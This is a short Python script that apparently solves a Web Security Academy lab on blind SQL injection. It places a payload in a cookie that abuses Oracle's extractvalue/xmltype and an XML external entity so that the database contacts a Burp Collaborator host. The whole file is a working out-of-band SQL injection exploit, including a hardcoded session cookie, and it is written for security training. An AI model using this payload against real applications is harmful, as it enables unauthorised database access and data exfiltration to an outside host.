import requests
import urllib
import string

endpoint = "https://ac5c1f541e85f43fc13a397e006f00cf.web-security-academy.net/"
delay = 20

def sqli(payload):

    encoded_payload = urllib.parse.quote_plus(payload)
    headers = {
        'Cookie': f"session=oa92Qn7RebKNAAkENShc0nBg75eEYzxD;TrackingId=test{encoded_payload}"
    }
    print(headers)

    response = requests.get(endpoint, headers=headers)


def main():

    subdomain = "042owbf2mr5jg3l6035owficf3lt9i.burpcollaborator.net"
    payload = f"test' UNION (SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{subdomain}/\"> %remote;]>'),'/l') FROM dual)-- "
    sqli(payload)


if __name__ == '__main__':
    main()
